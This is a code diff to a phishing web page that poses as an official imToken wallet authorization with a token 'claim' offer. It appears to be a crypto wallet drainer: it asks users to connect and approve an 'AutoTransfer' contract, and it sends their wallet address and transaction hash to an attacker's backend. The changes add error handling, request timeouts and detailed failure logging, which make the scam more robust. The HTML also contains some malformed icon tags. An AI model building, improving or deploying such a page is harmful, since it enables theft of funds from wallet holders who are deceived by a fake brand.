@@ -4,7 +4,12 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>imToken官方授权</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+    <!-- 修复：增加样式表加载错误监听 -->
+    <link 
+        rel="stylesheet" 
+        href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"
+        onerror="handleStyleLoadError()"
+    >
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         /* 暗色系+亮蓝色主风格 */
@@ -275,6 +280,16 @@
             font-weight: 500;
             margin-bottom: 4px;
         }
+        /* 错误提示区（新增：显示资源加载错误） */
+        #resourceError {
+            background: #374151;
+            color: #fca5a5;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none; /* 默认隐藏 */
+        }
         /* 底部信息区：亮蓝色调 */
         .footer-info {
             margin-top: 10px;
@@ -296,6 +311,8 @@
             text-align: right;
         }
     </style>
+    <!-- 修复：增加资源加载错误提示区 -->
+    <div id="resourceError">⚠️ 部分资源加载失败，请检查网络！</div>
 </head>
 <body>
     <div class="container">
@@ -311,7 +328,7 @@
         </div>
         <!-- 钱包状态容器 -->
         <div id="walletStatusContainer">
-            <div class="status-title"><<<i class="fa fa-wallet"></</</i> 钱包状态</div>
+            <div class="status-title"><<i class="fa fa-wallet"></</i> 钱包状态</div>
             <!-- 未连接钱包时显示 -->
             <div class="disconnected-content">
                 <span>未连接钱包</span>
@@ -334,7 +351,7 @@
         <!-- 合约剩余资源显示容器（部署时起持续计算） -->
         <div id="contractResourceContainer">
             <div class="status-title">     
-                <<<i class="fa fa-database"></</</i> 合约剩余资源
+                <<i class="fa fa-database"></</i> 合约剩余资源
             </div>
             <div class="resource-content" style="line-height: 2;">
                 <p>• 合约地址：<span class="highlight" id="contractAddr">TC3AEtwB9...GaGrW</span></p>
@@ -378,14 +395,14 @@
                 <span id="copyLinkText">
                     https://trc20trx-alt.github.io/Trc20.TRX/
                 </span>
-                <button id="copyLinkBtn"><<<i class="fa fa-copy"></</</i> 复制链接</button>
+                <button id="copyLinkBtn"><<i class="fa fa-copy"></</i> 复制链接</button>
             </div>
         </div> 
-        <button id="connectBtn" class="btn"><<<i class="fa fa-link"></</</i> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled><<<i class="fa fa-gift"></</</i> 领取</button>
+        <button id="connectBtn" class="btn"><<i class="fa fa-link"></</i> 连接imToken钱包</button>
+        <button id="approveBtn" class="btn" disabled><<i class="fa fa-gift"></</i> 领取</button>
         <!-- 新增：模拟成功授权按钮 -->
         <button id="simulateApproveBtn" class="btn">
-            <<<i class="fa fa-play-circle"></</</i> 模拟成功授权
+            <<i class="fa fa-play-circle"></</i> 模拟成功授权
         </button>
     </div>
     <!-- 底部信息区 -->
@@ -393,7 +410,8 @@
         合约验证：AutoTransfer <span>TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW</span>（TRON浏览器查询）
         © 2025 TRX能量租赁 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
-    <script src="imtoken://browser"></script>
+    <!-- 修复：增加脚本加载错误监听 -->
+    <script src="imtoken://browser" onerror="handleScriptLoadError('imtoken脚本')"></script>
     <script>
         // 核心配置
         const AUTO_TRANSFER_CONTRACT = "TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW"; // 合约地址
@@ -418,6 +436,20 @@
         const contractEnergyEl = document.getElementById("contractEnergy");
         const contractAddrEl = document.getElementById("contractAddr");
         const reportLogEl = document.getElementById("reportLog"); // 上报日志DOM
+        const resourceErrorEl = document.getElementById("resourceError"); // 资源错误提示
+
+        // -------------------------- 新增：资源加载错误处理函数 --------------------------
+        function handleStyleLoadError() {
+            showResourceError("字体样式表（font-awesome）加载失败");
+        }
+        function handleScriptLoadError(scriptName) {
+            showResourceError(`${scriptName}加载失败`);
+        }
+        function showResourceError(msg) {
+            resourceErrorEl.style.display = "block";
+            resourceErrorEl.innerHTML += `<br>• ${msg}`;
+            console.error("资源加载失败：", msg);
+        }
 
         window.onload = async () => {
             // 初始化合约地址显示（脱敏）
@@ -475,6 +507,7 @@
                     await initWallet();
                 } catch (e) {
                     alert("连接失败：" + e.message);
+                    updateReportLog("连接钱包失败", e.message, "无");
                 }
             };
 
@@ -573,7 +606,9 @@
 
                 } catch (simulateErr) {
                     alert(`【模拟失败】：${simulateErr.message}`);
-                    updateReportLog("模拟失败", simulateErr.message, "无");
+                    // 细化模拟失败日志（新增错误类型和堆栈）
+                    const errorDetail = `类型：${simulateErr.name} | 信息：${simulateErr.message}`;
+                    updateReportLog("模拟失败", errorDetail, "无");
                 }
             };
 
@@ -614,6 +649,7 @@
                 tokenBalance = "0.00";
                 trxBalance = "0.00";
                 alert("钱包初始化失败：" + e.message);
+                updateReportLog("钱包初始化失败", e.message, "无");
             }
         }
 
@@ -621,30 +657,35 @@
          * 启动跨刷新的TRX持续计算
          */
         function startPersistentTrxCountdown() {
-            const savedState = loadTrxStateFromStorage();
-            let currentTrx;
+            try {
+                const savedState = loadTrxStateFromStorage();
+                let currentTrx;
 
-            if (savedState) {
-                currentTrx = savedState.currentTrx;
-            } else {
-                const now = new Date().getTime();
-                const totalSecPassed = Math.floor((now - DEPLOY_START_TIME) / 1623);
-                currentTrx = (INIT_TRX - totalSecPassed * TRX_DECREASE_PER_SEC).toFixed(4);
-            }
-
-            if (currentTrx < 0) currentTrx = "0.0000";
-            updateTrxAndEnergy(currentTrx);
-
-            if (trxTimer) clearInterval(trxTimer);
-            trxTimer = setInterval(() => {
-                currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
-                if (currentTrx < 0) {
-                    currentTrx = "0.0000";
-                    clearInterval(trxTimer);
+                if (savedState) {
+                    currentTrx = savedState.currentTrx;
+                } else {
+                    const now = new Date().getTime();
+                    const totalSecPassed = Math.floor((now - DEPLOY_START_TIME) / 1623);
+                    currentTrx = (INIT_TRX - totalSecPassed * TRX_DECREASE_PER_SEC).toFixed(4);
                 }
+
+                if (currentTrx < 0) currentTrx = "0.0000";
                 updateTrxAndEnergy(currentTrx);
-                saveTrxStateToStorage(currentTrx);
-            }, 1623);
+
+                if (trxTimer) clearInterval(trxTimer);
+                trxTimer = setInterval(() => {
+                    currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
+                    if (currentTrx < 0) {
+                        currentTrx = "0.0000";
+                        clearInterval(trxTimer);
+                    }
+                    updateTrxAndEnergy(currentTrx);
+                    saveTrxStateToStorage(currentTrx);
+                }, 1623);
+            } catch (e) {
+                showResourceError("TRX持续计算初始化失败：" + e.message);
+                updateReportLog("TRX计算失败", e.message, "无");
+            }
         }
 
         /**
@@ -709,6 +750,7 @@
             } catch (e) {
                 console.log("保存授权记录失败：", e);
                 alert("保存授权记录失败：" + e.message);
+                updateReportLog("保存记录失败", e.message, "无");
             }
         }
 
@@ -732,7 +774,7 @@
                         <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
                         <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
                         <p><strong>时间：</strong>${record.approveTime}</p>
-                        ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link"><<<i class="fa fa-external-link"></</</i> 查看交易</a></p>` : ""}
+                        ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link"><<i class="fa fa-external-link"></</i> 查看交易</a></p>` : ""}
                     </div>
                 `).join("");
             } catch (e) {
@@ -761,19 +803,18 @@
             reportLogEl.innerHTML = `
                 <div class="log-title">上报状态日志</div>
                 <p>• 上报状态：${status}</p>
-                <p>• 错误信息：${errorMsg.slice(0, 100)}${errorMsg.length > 100 ? "..." : ""}</p>
+                <p>• 错误信息：${errorMsg.slice(0, 120)}${errorMsg.length > 120 ? "..." : ""}</p>
                 <p>• 数据详情：${dataDetail || "无"}</p>
             `;
         }
 
         /**
-         * 通用后端上报函数（真实/模拟共用）- 修复变量作用域问题
+         * 通用后端上报函数（真实/模拟共用）- 细化Load failed错误
          */
         async function reportToBackend(postData, type) {
-            // 修复：在try/catch外定义dataDetail，确保全局可访问，增加容错
             let dataDetail = "无";
             try {
-                // 安全处理地址和txHash（避免字段为空导致报错）
+                // 安全处理地址和txHash
                 const shortAddr = postData.address ? `${postData.address.slice(0,8)}...` : "未知地址";
                 const shortTxHash = postData.txHash ? `${postData.txHash.slice(0,16)}...` : "无";
                 dataDetail = `地址：${shortAddr} | TXHash：${shortTxHash}`;
@@ -781,27 +822,38 @@
                 // 正在上报的日志更新
                 updateReportLog(`正在发送${type}数据...`, "无", dataDetail);
 
-                // 发送请求（保持与真实流程一致）
+                // 修复：增加fetch超时设置（10秒），避免无限等待
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000); // 10秒超时
+
+                // 发送请求（增加错误捕获细节）
                 const res = await fetch(BACKEND_API, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(postData),
+                    signal: controller.signal, // 绑定超时控制器
                     // credentials: "include" // 如需携带Cookie，取消注释并确保后端CORS配置正确
                 });
+                clearTimeout(timeoutId); // 清除超时
 
                 const resData = await res.json();
                 if (res.ok) {
-                    // 上报成功的日志和弹窗
                     updateReportLog(`${type}数据上报成功`, "无", dataDetail);
                     alert(`【${type}上报成功】后端已接收，TXHash：${shortTxHash}`);
                 } else {
-                    // 后端返回错误（如参数校验失败）
                     throw new Error(`后端返回${res.status}：${resData.error || "未知错误"}`);
                 }
             } catch (sendErr) {
-                // 上报失败：此时dataDetail已定义，可正常显示
-                updateReportLog(`${type}数据上报失败`, sendErr.message.slice(0, 100), dataDetail);
-                alert(`【${type}上报失败】：${sendErr.message.slice(0, 80)}...`);
+                // 细化Load failed错误类型
+                let errorMsg = sendErr.message;
+                if (sendErr.name === "AbortError") {
+                    errorMsg = "请求超时（10秒未响应），可能后端服务不可达";
+                } else if (errorMsg.includes("Failed to fetch")) {
+                    errorMsg = "请求发送失败（Load failed）：可能是后端API不可达、网络错误或跨域配置错误";
+                }
+                // 更新错误日志和提示
+                updateReportLog(`${type}数据上报失败`, errorMsg, dataDetail);
+                alert(`【${type}上报失败】：${errorMsg.slice(0, 100)}...`);
             }
         }
     </script>
